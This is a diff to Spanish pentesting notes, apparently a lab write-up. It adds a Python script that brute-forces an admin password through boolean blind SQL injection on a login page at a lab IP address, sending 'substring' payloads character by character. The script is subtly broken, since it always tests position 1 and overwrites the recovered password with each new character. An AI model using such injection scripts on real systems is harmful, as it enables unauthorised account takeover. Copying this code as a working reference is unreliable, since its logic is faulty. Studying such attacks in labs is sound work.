@@ -31,6 +31,68 @@ Saldra mensaje de que el usuario es correcto pero no el password si esta mal pon
 admin' and substring(username,1,1)='a'-- -
 ```
 
+Script s4vitar
+
+```
+#!/usr/bin/python3
+
+
+from pwn import *
+import requests,time, sys, pdb, signal, string
+
+def def_handler(sig, frame):
+	print("\n\n[!] Saliendo...\n")
+	sys.exit(1)
+
+
+#Ctrl + C
+
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+
+login_url="http://10.129.229.139/login.php"
+characters=string.ascii_lowercase + string.digits
+
+
+
+def makeSQLI():
+
+	p1 = log.progress("SQLI")
+	p1.status("Iniciando  proceso de fuerza bruta")	
+	time.sleep(2)
+
+
+	p2 = log.progress("Password")
+	password = ""
+
+	for position in range(1,50):
+		pass
+		for character in characters:
+			pass
+
+			post_data = { 'username': "admin' and substring(password,1,1)='%s'-- -" %character,
+							'password': 'test'
+							}
+
+			p1.status(post_data['username'])
+
+			r = requests.post(login_url, data=post_data)
+
+			if "Try again.." not in r.text:
+				password = character
+				p2.status(password)
+				break
+
+
+
+
+
+if __name__ == '__main__':
+	makeSQLI()
+```
+
 ## PHP Juggling 
 
 Una vez que sacamos el hash del usuario admin probamos esta vulnerabiidad. Esta vulnerabilida se proboca por no usar tres = en una comparacion entonces cosas que no son iguales al compararlas mal si son iguales por ejemplo:
